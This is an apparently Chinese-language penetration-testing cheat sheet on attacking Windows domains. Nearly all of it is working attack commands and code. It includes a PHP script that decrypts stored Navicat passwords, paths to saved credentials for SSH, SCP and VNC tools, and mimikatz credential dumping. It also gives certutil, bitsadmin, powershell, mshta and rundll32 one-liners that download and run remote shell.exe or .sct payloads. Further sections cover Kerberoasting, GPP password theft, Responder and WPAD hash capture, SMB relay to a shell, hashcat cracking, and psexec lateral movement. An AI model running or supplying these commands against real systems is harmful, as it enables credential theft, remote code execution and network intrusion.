    HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMSSQL\Servers\&lt;target&gt;
Oracle
    HKEY_CURRENT_USER\Software\PremiumSoft\NavicatOra\Servers\&lt;target&gt;
PostgreSQL
    HKEY_CURRENT_USER\Software\PremiumSoft\NavicatPG\Servers\&lt;target&gt;
SQLite
    HKEY_CURRENT_USER\Software\PremiumSoft\NavicatSQLite\Servers\&lt;target&gt;</code></pre><p><strong>Navicat解密脚本</strong></p>
<pre><code>&lt;?php
class NavicatPassword
{
    protected $version = 0;
    protected $aesKey = &#39;libcckeylibcckey&#39;;
    protected $aesIv = &#39;libcciv libcciv &#39;;
    protected $blowString = &#39;3DC5CA39&#39;;
    protected $blowKey = null;
    protected $blowIv = null;  
    public function __construct($version = 12)
    {
        $this-&gt;version = $version;
        $this-&gt;blowKey = sha1(&#39;3DC5CA39&#39;, true);
        $this-&gt;blowIv = hex2bin(&#39;d9c7c3c8870d64bd&#39;);
    } 
    public function encrypt($string)
    {
        $result = FALSE;
        switch ($this-&gt;version) {
            case 11:
                $result = $this-&gt;encryptEleven($string);
                break;
            case 12:
                $result = $this-&gt;encryptTwelve($string);
                break;
            default:
                break;
        }     
        return $result;
    }  
    protected function encryptEleven($string)
    {
        $round = intval(floor(strlen($string) / 8));
        $leftLength = strlen($string) % 8;
        $result = &#39;&#39;;
        $currentVector = $this-&gt;blowIv;    
        for ($i = 0; $i &lt; $round; $i++) {
            $temp = $this-&gt;encryptBlock($this-&gt;xorBytes(substr($string, 8 * $i, 8), $currentVector));
            $currentVector = $this-&gt;xorBytes($currentVector, $temp);
            $result .= $temp;
        }    
        if ($leftLength) {
            $currentVector = $this-&gt;encryptBlock($currentVector);
            $result .= $this-&gt;xorBytes(substr($string, 8 * $i, $leftLength), $currentVector);
        }    
        return strtoupper(bin2hex($result));
    }
    protected function encryptBlock($block)
    {
        return openssl_encrypt($block, &#39;BF-ECB&#39;, $this-&gt;blowKey, OPENSSL_RAW_DATA|OPENSSL_NO_PADDING);
    }
    protected function decryptBlock($block)
    {
        return openssl_decrypt($block, &#39;BF-ECB&#39;, $this-&gt;blowKey, OPENSSL_RAW_DATA|OPENSSL_NO_PADDING);
    }
    protected function xorBytes($str1, $str2)
    {
        $result = &#39;&#39;;
        for ($i = 0; $i &lt; strlen($str1); $i++) {
            $result .= chr(ord($str1[$i]) ^ ord($str2[$i]));
        }    
        return $result;
    }
    protected function encryptTwelve($string)
    {
        $result = openssl_encrypt($string, &#39;AES-128-CBC&#39;, $this-&gt;aesKey, OPENSSL_RAW_DATA, $this-&gt;aesIv);
        return strtoupper(bin2hex($result));
    }   
    public function decrypt($string)
    {
        $result = FALSE;
        switch ($this-&gt;version) {
            case 11:
                $result = $this-&gt;decryptEleven($string);
                break;
            case 12:
                $result = $this-&gt;decryptTwelve($string);
                break;
            default:
                break;
        }      
        return $result;
    }  
    protected function decryptEleven($upperString)
    {
        $string = hex2bin(strtolower($upperString));    
        $round = intval(floor(strlen($string) / 8));
        $leftLength = strlen($string) % 8;
        $result = &#39;&#39;;
        $currentVector = $this-&gt;blowIv;  
        for ($i = 0; $i &lt; $round; $i++) {
            $encryptedBlock = substr($string, 8 * $i, 8);
            $temp = $this-&gt;xorBytes($this-&gt;decryptBlock($encryptedBlock), $currentVector);
            $currentVector = $this-&gt;xorBytes($currentVector, $encryptedBlock);
            $result .= $temp;
        }   
        if ($leftLength) {
            $currentVector = $this-&gt;encryptBlock($currentVector);
            $result .= $this-&gt;xorBytes(substr($string, 8 * $i, $leftLength), $currentVector);
        }   
        return $result;
    }  
    protected function decryptTwelve($upperString)
    {
        $string = hex2bin(strtolower($upperString));
        return openssl_decrypt($string, &#39;AES-128-CBC&#39;, $this-&gt;aesKey, OPENSSL_RAW_DATA, $this-&gt;aesIv);
    }
};
//需要指定navacat版本两种，11或12
$navicatPassword = new NavicatPassword(11);
//解密，括号里面写入navicat加密后的密码
$decode = $navicatPassword-&gt;decrypt(&#39;45532326F8&#39;); #密文密码解密
echo $decode.&quot;\n&quot;;
?&gt;</code></pre><p><strong>SecureCRT</strong></p>
<pre><code>xp/win2003
    C:\Documents and Settings\USERNAME\Application Data\VanDyke\Config\Sessions
win7/win2008以上
    C:\Users\USERNAME\AppData\Roaming\VanDyke\Config\Sessions</code></pre><p><strong>Xshell</strong></p>
<pre><code>Xshell 5
    %userprofile%\Documents\NetSarang\Xshell\Sessions
Xshell 6
    %userprofile%\Documents\NetSarang Computer\6\Xshell\Sessions</code></pre><p><strong>WinSCP</strong></p>
<pre><code>HKCU\Software\Martin  Prikryl\WinSCP 2\Sessions</code></pre><p><strong>VNC</strong></p>
<pre><code>RealVNC
    HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\vncserver    Password
TightVNC
    HKEY_CURRENT_USER\Software\TightVNC\Server Value    Password or PasswordViewOnly
TigerVNC
    HKEY_LOCAL_USER\Software\TigerVNC\WinVNC4    Password
UltraVNC
    C:\Program  Files\UltraVNC\ultravnc.ini        passwd or passwd2</code></pre><p><strong>mimikatz解密Chrome密码</strong></p>
<pre><code>mimikatz dpapi::chrome /in:&quot;%localappdata%\Google\Chrome\User Data\Default\Login Data&quot; /unprotect</code></pre><p><strong>mimikatz解密Credential</strong></p>
<pre><code>mimikatz  vault::cred /patch</code></pre><h3 id="0x16-WIFI密码"><a href="#0x16-WIFI密码" class="headerlink" title="0x16 WIFI密码"></a>0x16 WIFI密码</h3><ol>
<li><code>for /f  &quot;skip=9 tokens=1,2 delims=:&quot; %i in (&#39;netsh wlan show profiles&#39;)  do  @echo %j | findstr -i -v echo |  netsh wlan show profiles %j key=clear</code> #一行命令获取连接过的WiFi密码</li>
</ol>
<h3 id="0x17-单行命令扫描存活主机"><a href="#0x17-单行命令扫描存活主机" class="headerlink" title="0x17 单行命令扫描存活主机"></a>0x17 单行命令扫描存活主机</h3><ol>
<li>windows版：</li>
<li><code>for /l %p in (1,1,254) do @ping -l 1 -n 3 -w 40 192.168.0.%p &amp; if errorlevel 1 (echo 192.168.0.%p&gt;&gt;na.txt) else (echo 192.168.0.%p&gt;&gt;ok.txt)</code></li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/11.png" alt></li>
<li>Linux版：</li>
<li><code>for i in {1..254}; do ping -q -i 0.01 -c 3 192.168.0.$i &amp;&gt; /dev/null &amp;&amp; echo 192.168.0.$i is alive; done</code></li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/10.png" alt></li>
<li>一行命令扫描存活IP：<code>for /l %i in (1,1,255) do @ping 192.168.0.%i -w 1 -n 1 | find /i &quot;ttl&quot;</code></li>
<li>一行命令扫描存活IP输出到文件：<code>@for /l %i in (1,1,255) do @ping -n 1 -w 1 192.168.0.%i &amp; if errorlevel 1 (echo 192.168.0.%i&gt;&gt;c:\\ips_dead.txt) else (echo 192.168.0.%i &gt;&gt;c:\\ips_alive.txt)</code></li>
</ol>
<h3 id="0x18-windows自带工具命令行下载文件"><a href="#0x18-windows自带工具命令行下载文件" class="headerlink" title="0x18 windows自带工具命令行下载文件"></a>0x18 windows自带工具命令行下载文件</h3><ol>
<li><a href="https://xz.aliyun.com/t/1654" target="_blank" rel="noopener">https://xz.aliyun.com/t/1654</a></li>
<li><code>certutil -urlcache -split -f http://IP/shell.exe</code></li>
<li><code>bitsadmin /transfer downloadfile /download &quot;http://IP/shell.exe&quot; &quot;c:\\shell.exe&quot;</code></li>
<li><code>bitsadmin /transfer 123 http://IP/shell.exe c:\\shell.exe</code></li>
<li><code>powershell (new-object net.webclient).downloadfile(&#39;http://IP/shell.exe&#39;,&#39;c:\\shell.exe&#39;)</code></li>
<li><code>powershell -w hidden -c (new-object system.net.webclient).downloadfile(&#39;http://IP/shell.exe&#39;,&#39;c:\\shell.exe&#39;)</code></li>
<li><pre><code class="mshta">




</code></pre>
</li>
</ol>
<h3 id="0x19-windows-执行远程文件"><a href="#0x19-windows-执行远程文件" class="headerlink" title="0x19 windows 执行远程文件"></a>0x19 windows 执行远程文件</h3><ol>
<li><a href="https://xz.aliyun.com/t/1654" target="_blank" rel="noopener">https://xz.aliyun.com/t/1654</a></li>
<li><code>mshta vbscript:close(execute(&quot;getobject(&quot;&quot;script:http://IP/file.sct)&quot;&quot;))&quot;</code></li>
<li><code>mshta http://IP/file.hta</code></li>
<li><code>mshta \\IP\folder\file.hta</code></li>
<li><code>rundll32 \\IP\folder\file.dll,entrypoint</code></li>
<li><code>rundll32 javascript:&quot;\..\mshtml,runhtmlapplication&quot;;o=getobject(&quot;script:http://IP/file.sct&quot;);windows.close();</code></li>
<li><code>C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /u \\IP\folder\payload.dll</code></li>
</ol>
<hr>
<h2 id="0x20-域信息搜集命令一"><a href="#0x20-域信息搜集命令一" class="headerlink" title="0x20 域信息搜集命令一"></a>0x20 域信息搜集命令一</h2><ol>
<li><strong>域：Windows网络中独立运行的单位。域之间相互访问则需要建立信任关系（Trust Relation）。</strong></li>
<li><code>net config workstation</code> #查看当前域，可得计算机名、用户名、计算机全名、登录域，ping域得域控IP</li>
<li><code>net accounts /domain</code> #查看域密码策略</li>
<li><code>net user /domain</code> #查询域用户，得域控主机名+域，ping域得域控IP</li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/106.png" alt></li>
<li><code>net time /domain</code> #查看域时间，得域，ping域得域控IP</li>
<li><code>net time \\computername/IP</code> #查看目标的时间</li>
<li><code>net view</code> #显示域、计算机或由指定计算机共享资源的[servername]列表</li>
<li><code>nbtstat -a [servername]</code> #查看本地远程计算机上的NetBIOS名称列表</li>
<li><code>nbtstat -A IP</code> #windows命令查看远程主机的用户名列表</li>
<li><code>nbtscan -vh IP</code> #Linux命令查看远程主机的用户名列表</li>
<li><code>net localgroup administrators /domain</code> #查看域管理员</li>
<li><code>net group /domain</code> #查看域用户组</li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/123.png" alt></li>
<li><code>net group &quot;domain computers&quot; /domain</code> #查看所有域成员列表（计算机名+$）</li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/122.png" alt></li>
<li><code>net group &quot;enterprise admins&quot; /domain</code> #查看企业管理员列表</li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/119.png" alt></li>
<li><code>net group &quot;domain admins&quot; /domain</code> #查看域管理员</li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/120.png" alt></li>
<li><code>net group &quot;domain controllers&quot; /domain</code> #查看域控制器</li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/121.png" alt></li>
<li><code>ping 域控制器[无$]</code> #获取域控IP</li>
<li><code>net localgroup administrators /domain</code> #查看可登录本机的域管理员</li>
<li><code>net user username password /add /domain</code> #添加域用户</li>
<li><code>net group &quot;domain admins&quot; username /add /domain</code> #提升到域管</li>
<li><code>dsadd user cn=[username],dc=god,dc=org -disabled no -pwd [password]</code> #添加域用户</li>
<li><code>setspn -U -A test/test test</code> #为用户帐户 “test” 注册 SPN “test/test”</li>
<li><code>nltest /domain_trusts</code> #查看域信任</li>
<li>下图为一条域信任，两条则为双向信任</li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/60.png" alt></li>
<li><code>$env:userdnsdomain</code> #powershell执行，查看当前域</li>
<li><code>net view /domain</code> #查询域列表</li>
<li><code>net view /domain:[domainname]</code> #显示域、计算机或由指定计算机共享资源的列表</li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/98.png" alt></li>
<li><code>net view \\servername或domain_ip</code> #显示域、计算机或由指定计算机共享资源的列表</li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/97.png" alt></li>
<li>SYSVOL是指存储域公共文件服务器副本的共享的文件夹，它们在域中所有的域控制器之间复制。</li>
<li><code>dir \\domain_IP\SYSVOL</code></li>
<li><code>dir \\domain_IP\NETLOGON</code></li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/99.png" alt></li>
<li>认证用户（所有域用户或者信任域里的用户）对SYSVOL拥有读权限。</li>
<li><code>dir /S /A \\192.168.52.138\SYSVOL</code> #树状列出文件</li>
</ol>
<p><strong>GPP（Group Policy Preference：组策略首选项）</strong></p>
<ol>
<li>当分发组策略时，会在域的SYSVOL目录下生成一个gpp配置的xml文件，如果在配置组策略时填入了密码，则其中会存在加密过的账号密码。这些密码，往往都是管理员的密码。</li>
<li></li>
<li>其中xml中的密码是aes加密的，密钥已被微软公开：</li>
<li><a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN</a></li>
<li></li>
<li>解密脚本：</li>
<li><a href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1" target="_blank" rel="noopener">https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1</a></li>
<li><a href="/Powershel/Get-GPPPassword.ps1">Get-GPPPassword.ps1</a></li>
<li><code>powershell  import-module  .\Get-GPPpassword.ps1;Get-GppPassword</code></li>
<li>MSF</li>
<li><code>use post/windows/gather/credentials/gpp</code></li>
</ol>
<h2 id="0x21-域信息搜集命令二"><a href="#0x21-域信息搜集命令二" class="headerlink" title="0x21 域信息搜集命令二"></a>0x21 域信息搜集命令二</h2><ol>
<li>SPN（Service Principal Names，服务主体名称）是服务实例（可以理解为一个服务，比如 HTTP、MSSQL）的唯一标识符。</li>
<li>SPN类型分两种：</li>
<li><ul>
<li>一种注册在AD上机器帐户(Computers)下，当一个服务的权限为Local System或Network Service，则SPN注册在机器帐户(Computers)下</li>
</ul>
</li>
<li><ul>
<li>另一种注册在域用户帐户(Users)下，当一个服务的权限为一个域用户，则SPN注册在域用户帐户(Users)下</li>
</ul>
</li>
<li>SetSPN是一个本地windows二进制文件，可用于检索用户帐户和服务之间的映射。该实用程序可以添加，删除或查看SPN注册。</li>
<li><code>setspn -T god.org -Q */*</code>  #查god.org域下注册的SPN</li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/59.png" alt></li>
<li>GetUserSPNs.vbs：<a href="https://github.com/nidem/kerberoast" target="_blank" rel="noopener">https://github.com/nidem/kerberoast</a></li>
<li><code>cscript GetUserSPNs.vbs</code></li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/61.png" alt></li>
<li><code>.\GetUserSPNs.ps1</code></li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/62.png" alt></li>
<li><code>$SPNName = &#39;test/test&#39;</code></li>
<li><code>Add-Type -AssemblyNAme System.IdentityModel</code></li>
<li><code>New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $SPNName</code></li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/107.png" alt></li>
<li>导出所有票据：<code>.\mimikatz.exe &quot;privilege::debug&quot; &quot;kerberos::list /export&quot;</code></li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/108.png" alt></li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/109.png" alt></li>
<li>使用tgsrepcrack.py爆破：<a href="https://github.com/nidem/kerberoast" target="_blank" rel="noopener">https://github.com/nidem/kerberoast</a></li>
<li><code>python tgsrepcrack.py password.txt 2-40a00000-Administrator@test~test-GOD.ORG.kirbi</code></li>
<li>重写用户信息：</li>
<li><code>python tgsrepcrack.py &lt;password&gt; -r 2-40a00000-Administrator@test~test-GOD.ORG.kirbi -w test.kirbi -u 500</code> #</li>
<li><code>python tgsrepcrack.py &lt;password&gt; -r 2-40a00000-Administrator@test~test-GOD.ORG.kirbi -w test.kirbi -g 512</code> #添加到组</li>
<li>用Mimikatz注入RAM</li>
<li><code>mimikatz.exe &quot;privilege::debug&quot; &quot;kerberos::ptt test.kirbi&quot;</code></li>
<li><code>Rubeus.exe kerberoast</code></li>
<li><strong>windows版：</strong></li>
<li><code>nslookup -type=ns [domain]</code> #域传送<pre><code>nslookup
server dns.[domain]
ls [domain]</code></pre></li>
<li><strong>Linux版：</strong></li>
<li><code>dig @dns.[domain] axfr [domain]</code></li>
<li></li>
<li><strong>dnscmd</strong> <a href="https://docs.microsoft.com/zh-cn/windows-server/administration/windows-commands/dnscmd#dnscmd-zoneprint-command" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/windows-server/administration/windows-commands/dnscmd#dnscmd-zoneprint-command</a></li>
<li><code>dnscmd /zoneprint [domain]</code> #获取dns记录</li>
<li><code>dnscmd /enumrecords [domain]</code></li>
<li><strong>使用kerbrute对域用户/密码进行暴力破解</strong> <a href="https://github.com/ropnop/kerbrute" target="_blank" rel="noopener">https://github.com/ropnop/kerbrute</a></li>
<li><code>kerbrute userenum -d god.org usernames.txt</code></li>
<li><code>kerbrute passwordspray -d god.org username.txt aA1234567</code></li>
</ol>
<hr>
<h2 id="0x22-wmic（Windows-Management-InstrumentationCommand-Line：Windows管理规范命令行）"><a href="#0x22-wmic（Windows-Management-InstrumentationCommand-Line：Windows管理规范命令行）" class="headerlink" title="0x22 wmic（Windows Management InstrumentationCommand Line：Windows管理规范命令行）"></a>0x22 wmic（Windows Management InstrumentationCommand Line：Windows管理规范命令行）</h2><ol>
<li>wmic product list brief #列出所有安装程序与版本信息</li>
<li>wmic service list brief #列出所有服务</li>
<li>wmic process list brief #列出所有进程</li>
<li>wmic startup list brief #列出开机启动项</li>
<li>wmic useraccount list brief #列出用户</li>
<li>wmic sysaccount list brief #列出系统账户</li>
<li>wmic qfe get Caption,Description,HotFixID,InstalledOn #查看补丁连接，描述，编号，安装时间</li>
<li>wmic os #查看操作系统类型</li>
<li>wmic /node:IP /user:[username] /password:[password] </li>
</ol>
<h2 id="0x23-Bloodhound"><a href="#0x23-Bloodhound" class="headerlink" title="0x23 Bloodhound"></a>0x23 Bloodhound</h2><ol>
<li>利用Bloodhound做一些自动化的信息收集（易触发告警）</li>
<li><code>SharpHound.exe -c all</code></li>
</ol>
<h2 id="0x24-利用LLMNR和NetBIOS欺骗获得Net-NTLMHash"><a href="#0x24-利用LLMNR和NetBIOS欺骗获得Net-NTLMHash" class="headerlink" title="0x24 利用LLMNR和NetBIOS欺骗获得Net-NTLMHash"></a>0x24 利用LLMNR和NetBIOS欺骗获得Net-NTLMHash</h2><ol>
<li><a href="https://www.freebuf.com/articles/network/243530.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/network/243530.html</a></li>
<li>链路本地多播名称解析（LLMNR）是一个基于域名系统（DNS）数据包格式的协议，IPv4和IPv6的主机可以通过此协议对同一本地链路上的主机执行名称解析。当局域网中的DNS服务器不可用时，DNS客户端会使用LLMNR本地链路多播名称解析来解析本地网段上的主机的名称，直到网络连接恢复正常为止。</li>
<li>Netbios(Network Basic Input Output System)：网络基本输入输出系统，提供了OSI模型中的会话层服务，让在不同计算机上运行的不同程序，可以在局域网中，互相连线，以及分享数据。</li>
</ol>
<p><strong>Windows系统名称解析顺序</strong></p>
<ol>
<li>本地hosts文件（%windir%\System32\drivers\etc\hosts）</li>
<li>DNS缓存/DNS服务器</li>
<li>链路本地多播名称解析（LLMNR）和NetBIOS名称服务（NBT-NS）</li>
<li>如果在DNS缓存中没有找到名称，DNS名称服务器又请求失败时，Windows系统就会通过链路本地多播名称解析（LLMNR）和Net-BIOS名称服务（NBT-NS）在本地进行名称解析。</li>
<li>由于该过程未被认证，并且广播到整个网络，从而允许网络上的任何机器响应并声称是目标机器。通过工具监听LLMNR和NetBIOS广播，攻击者可以伪装成受害者要访问的目标机器，并从而让受害者交出相应的登陆凭证。</li>
</ol>
<ol>
<li>工具：<a href="https://github.com/sdfzy/Responder" target="_blank" rel="noopener">https://github.com/sdfzy/Responder</a>，kali自带</li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/63.png" alt></li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/64.png" alt></li>
<li><code>responder -I eth0 -f</code> #-I：网卡，-f：允许攻击者查看受害者的主机指纹，ON：开启监听，OFF：关闭监听</li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/65.png" alt></li>
<li><code>net user \\[任意字符]</code> </li>
<li><code>dir \\[任意字符]\c$</code> #检查内部名称缓存及DNS都无法找到的，就会通过LLMNR和NetBIOS在局域网中搜索。</li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/66.png" alt></li>
<li>监听到受害者的Net-NTLM hash</li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/67.png" alt></li>
<li>停止responder后，会将抓取的数据存储在 /usr/share/responder/logs/ 文件夹下</li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/68.png" alt></li>
<li><code>hashcat -h | grep NetNTLMv2</code></li>
<li><code>hashcat -m 5600 [NTLMv2_hash.txt] password.txt</code></li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/69.png" alt></li>
<li>这里需好大字典</li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/70.png" alt></li>
</ol>
<h2 id="0x25-利用WPAD劫持获得Net-NTLMHash"><a href="#0x25-利用WPAD劫持获得Net-NTLMHash" class="headerlink" title="0x25 利用WPAD劫持获得Net-NTLMHash"></a>0x25 利用WPAD劫持获得Net-NTLMHash</h2><ol>
<li>WPAD 网络代理自动发现协议是一种客户端使用DCHP、DNS、LLMNR、NBNS协议来定位一个代理配置文件(PAC)URL的方法。</li>
<li>WPAD通过让浏览器自动发现代理服务器，查找存放PAC 文件的主机来定位代理配置文件，下载编译并运行，最终自动使用代理访问网络。</li>
<li>利用LLMNR/NBNS欺骗来让受害者从攻击者获取PAC文件，PAC文件指定攻击者就是代理服务器，然后攻击者就可以劫持受害者的HTTP流量，在其中插入任意HTML标签从而获得用户的Net-NTLMHash。</li>
<li>攻击者浏览器设置代理为 自动检测代理设置</li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/71.png" alt></li>
<li><code>responder -I eth0 -r on -v -F on -w on</code></li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/72.png" alt></li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/73.png" alt></li>
<li>受害主机浏览器访问：<code>http://wadp</code>，受害者不注意输入了域账户密码</li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/74.png" alt></li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/75.png" alt></li>
<li>停止responder后，会将抓取的数据存储在 /usr/share/responder/logs/ 文件夹下</li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/76.png" alt></li>
<li><code>hashcat -m 5600 [HTTP-NTLMv2-hash.txt] password.txt</code></li>
<li>破解后密码在hash后</li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/77.png" alt></li>
</ol>
<h2 id="0x26-SMB-Relay（SMB中继）攻击（Responder中的MultiRelayx-py）"><a href="#0x26-SMB-Relay（SMB中继）攻击（Responder中的MultiRelayx-py）" class="headerlink" title="0x26 SMB Relay（SMB中继）攻击（Responder中的MultiRelayx.py）"></a>0x26 SMB Relay（SMB中继）攻击（Responder中的MultiRelayx.py）</h2><ol>
<li><a href="https://www.freebuf.com/articles/network/244375.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/network/244375.html</a></li>
<li>Net-NTLM Hash：Net-NTLM Hash 是基于用户密码的NTLM Hash计算出来的，用于在网络环境下 NTLM 认证的 hash。在下面的NTLM认证过程中你可以知道Net-NTLM Hash产生的过程。</li>
<li>NTLM Hash：NTLM hash 就是里面加密保存了用户密码的 hash。Windows 中的用户密码被系统加密后保存在 SAM 文件中，如果是域环境则保存在域控的 NTDS.dit 中。</li>
<li>工具：<a href="https://github.com/SpiderLabs/Responder/releases" target="_blank" rel="noopener">https://github.com/SpiderLabs/Responder/releases</a>，kali自带</li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/78.png" alt></li>
<li>kali设置IP进内网</li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/79.png" alt></li>
<li><code>python RunFinger.py -i 192.168.52.1/24</code></li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/80.png" alt></li>
<li>138主机的SMB 签名启用状态，其他为禁用状态，<code>攻击前提是目标主机没有开启smb签名</code></li>
<li>利用MultiRelay.py攻击，获得目标主机的shell：</li>
<li><code>python MultiRelay.py -t 192.168.52.143 -u ALL</code></li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/81.png" alt></li>
<li>现在 SMB 已经由 MultiRelay.py 脚本来进行中继，修改responder的配置文件 Responder.conf，不让其对 hash 进行抓取。将SMB和HTTP的On改为Off</li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/82.png" alt></li>
<li><code>responder -I eth1</code></li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/83.png" alt></li>
<li>受害主机DC随意执行SMB流量：<code>dir \\123123123\c$</code></li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/84.png" alt></li>
</ol>
<h2 id="0x27-SMB-Relay（SMB中继）攻击（Impacket中的smbrelayx-py）"><a href="#0x27-SMB-Relay（SMB中继）攻击（Impacket中的smbrelayx-py）" class="headerlink" title="0x27 SMB Relay（SMB中继）攻击（Impacket中的smbrelayx.py）"></a>0x27 SMB Relay（SMB中继）攻击（Impacket中的smbrelayx.py）</h2><ol>
<li>工具：<a href="https://github.com/SecureAuthCorp/impacket" target="_blank" rel="noopener">https://github.com/SecureAuthCorp/impacket</a></li>
<li>攻击者：192.168.52.111</li>
<li>DC：192.168.52.138</li>
<li>C1：192.168.52.143</li>
<li>攻击者：</li>
<li><code>python smbrelayx.py -h C1</code></li>
<li>DC：</li>
<li><code>net use \\192.168.52.111</code></li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/86.png" alt></li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/85.png" alt></li>
<li><code>dir \\192.168.52.111\c$</code></li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/87.png" alt></li>
<li><code>python smbrelayx.py -h C1 -c command</code></li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/88.png" alt></li>
</ol>
<hr>
<h2 id="0x30-横向渗透——域中获取账号后"><a href="#0x30-横向渗透——域中获取账号后" class="headerlink" title="0x30 横向渗透——域中获取账号后"></a>0x30 横向渗透——域中获取账号后</h2><ol>
<li><strong>工具：</strong></li>
<li><code>python psexec.py administrator@192.168.111.16</code></li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/110.png" alt></li>
<li><a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/psexec" target="_blank" rel="noopener">psexec.exe/psexec64.exe</a>：windows工具，允许执行远程系统上安装的程序</li>
<li>命令：<code>psexec.exe \\远程主机IP -u [domain\username] -p [password] -h cmd /c &quot;[commands]&quot;</code></li>
<li>执行可执行文件：<code>psexec.exe \\IP -u [domain\username] -p [password] -h cmd /c \\IP\path\exe</code></li>
<li><code>psexec -s \\IP -u [domain\username] -p [password] cmd</code> #返回目标IP shell</li>
<li>例子：<code>psexec64.exe \\192.168.100.6 -u administrator -p Admin123 cmd</code> #远程登录服务器</li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/1.png" alt></li>
<li>例子：<code>psexec64.exe \\192.168.111.16 -u god\administrator -p Hongrisec@2019 -h cmd</code> #远程登录域内服务器</li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/89.png" alt></li>
